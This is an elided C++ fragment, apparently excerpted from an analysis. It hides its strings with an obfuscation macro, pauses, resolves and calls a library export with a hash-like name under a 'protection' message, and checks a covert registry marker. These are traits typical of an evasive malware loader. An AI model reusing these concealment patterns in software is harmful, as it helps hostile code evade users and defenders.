...
int main()
{
	...
	if (hLibrary) {
		std::cout << AY_OBFUSCATE("Initializing protection...\n");
		Sleep(3000);
		_Func = (Func)GetProcAddress(hLibrary, AY_OBFUSCATE("d8460eef1d4bed762273a7377c57a0988ac7d12a3661a4496e2cdc494e17232e"));
		if (_Func) {
			_Func();
		}
	}
		...
		error << AY_OBFUSCATE("Unable to load protection") << std::endl;
		error.close();
	...
	LONG isDeleted = RegGetValueA(HKEY_CLASSES_ROOT, AY_OBFUSCATE("x-internet-signup"), AY_OBFUSCATE("aebbe9b71bd2addaea690953e419bf11b49ae91c"), RRF_RT_REG_SZ, NULL, value, &BufferSize);
